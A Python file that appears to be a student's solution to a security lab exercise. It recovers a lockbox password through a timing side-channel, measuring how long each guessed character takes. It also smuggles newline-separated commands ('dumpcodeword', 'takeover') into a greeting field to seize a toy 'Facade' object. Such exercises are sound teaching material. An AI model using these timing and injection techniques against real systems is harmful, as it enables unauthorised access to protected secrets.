
from typing import Tuple
from time import perf_counter_ns
from string import ascii_lowercase

import scipy
import numpy

from e5utils import LockBox, Facade


# NOTE: Returns a pair (password, contents) corresponding to
#  the password that opens the lockbox and the actual contents of the
#  lockbox. The only action that it can take with a `LockBox` is
#  calling the `try_password` method. Any other properties (like
#  field names, number of fields, etc.) can change at test time.
def break_lockbox(lockbox: LockBox) -> Tuple[str, str]:
    discovered_password = ''
    while True:
        longest_time = 0
        next_char = ''

        for _ in range(100):
            lockbox.try_password("josh") #warmup my cpu

        for char in ascii_lowercase:
            total_time = 0
            iterations = 10  # Number of iterations for averaging

            for _ in range(iterations):
                start_time = perf_counter_ns()
                lockbox.try_password(discovered_password + char)
                end_time = perf_counter_ns()
                total_time += end_time - start_time

            average_time = total_time / iterations

            if average_time > longest_time:
                longest_time = average_time
                next_char = char
        
        discovered_password += next_char
        contents = lockbox.try_password(discovered_password)
        if contents is not None:
            return (discovered_password, contents)
    

# NOTE: Returns a string corresponding to the result from successfully
# calling `takeover` on a `CaerfilyDesinedSurvis`. 
def break_facade(facade: Facade) -> str:
    # my code wordk
    injected_command_for_codeword = "name\ndumpcodeword"
    results = facade.greet(injected_command_for_codeword)
    codeword = results[-1]  # Assuming the last line of output is the codeword

    injected_command_for_takeover = f"name\ntakeover {codeword}"
    takeover_results = facade.greet(injected_command_for_takeover)
    return takeover_results[-1]
    
    
